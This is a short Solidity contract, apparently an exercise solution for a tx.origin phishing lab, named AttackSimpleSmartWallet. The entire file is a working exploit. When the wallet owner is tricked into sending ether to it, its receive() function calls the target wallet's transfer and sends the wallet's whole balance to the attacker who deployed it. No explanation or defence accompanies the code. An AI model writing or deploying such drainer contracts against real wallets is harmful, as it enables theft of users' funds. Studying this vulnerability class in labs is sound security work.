pragma solidity ^0.8.13;

// import "contracts/tx-origin-phishing-1/SimpleSmartWallet.sol";

interface ISimpleSmartWallet {
  function transfer(address, uint) external;
}

contract AttackSimpleSmartWallet {
    address payable public walletOwner;
    ISimpleSmartWallet private target;

    constructor(address _target) payable {
        walletOwner = payable(msg.sender);
        target = ISimpleSmartWallet(_target);
    }


    receive() external payable {
      target.transfer(walletOwner, address(target).balance);
    }
}

